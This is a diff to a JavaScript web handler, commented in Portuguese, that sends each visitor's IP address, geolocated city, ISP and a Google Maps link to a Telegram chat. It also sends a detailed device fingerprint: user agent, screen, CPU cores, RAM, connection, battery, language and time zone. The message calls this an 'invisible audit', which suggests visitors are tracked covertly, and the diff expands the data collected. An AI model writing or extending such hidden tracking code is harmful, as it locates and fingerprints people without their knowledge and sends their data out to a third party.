@@ -20,13 +20,24 @@ export default async function handler(req, res) {
             const geo = await geoRes.json();
             if (geo.status === 'success') {
                 locText = `${geo.city} - ${geo.regionName} (${geo.country})\n📡 *Provedor:* ${geo.isp}`;
-                mapsLink = `\n🗺️ *MAPA:* [Ver no Google Maps](http://googleusercontent.com/maps.google.com/maps?q=${geo.lat},${geo.lon})`;
+                // LINK DO MAPA CORRIGIDO AQUI:
+                mapsLink = `\n🗺️ *MAPA:* [Abrir no Google Maps](https://www.google.com/maps?q=${geo.lat},${geo.lon})`;
             }
         }
     } catch (e) { console.error("Erro na geolocalização"); }
 
     const linha = "➖➖➖➖➖➖➖➖➖➖\n";
-    const msgAcesso = `👀 *INFOPETO ACESSADO* 👀\n${linha}🌐 *IP:* \`${ip}\`\n📍 *LOCAL (Aprox.):* \n${locText}${mapsLink}\n\n📱 *DADOS DO APARELHO:*\n• *Bateria:* ${fingerprint.bateria}\n• *Tela:* ${fingerprint.tela}\n• *Sistema:* ${fingerprint.plataforma}\n• *Navegador:* ${fingerprint.userAgent}\n\n⏰ *HORA LOCAL:* ${fingerprint.horaLocal}\n${linha}_Auditoria Invisível Concluída._`;
+    const msgAcesso = `👀 *INFOPETO ACESSADO* 👀\n${linha}` +
+        `🌐 *IP:* \`${ip}\`\n` +
+        `📍 *LOCAL (Aprox.):* \n${locText}${mapsLink}\n\n` +
+        `📱 *DADOS DO APARELHO:*\n` +
+        `• *Sistema:* ${fingerprint.userAgent}\n` +
+        `• *Ecrã:* ${fingerprint.tela} (Touch: ${fingerprint.touch})\n` +
+        `• *Hardware:* CPU ${fingerprint.processador} Núcleos | RAM ~${fingerprint.ram}GB\n` +
+        `• *Rede:* Conexão ${fingerprint.conexao}\n` +
+        `• *Bateria:* ${fingerprint.bateria}\n` +
+        `• *Config:* ${fingerprint.idioma} | ${fingerprint.fuso}\n\n` +
+        `⏰ *HORA ACESSO:* ${fingerprint.horaLocal}\n${linha}_Auditoria Invisível Concluída._`;
     
     let payload = { chat_id: CHAT_ID, text: msgAcesso, parse_mode: 'Markdown', disable_web_page_preview: true };
     if (TOPIC_SEGURANCA) payload.message_thread_id = TOPIC_SEGURANCA;
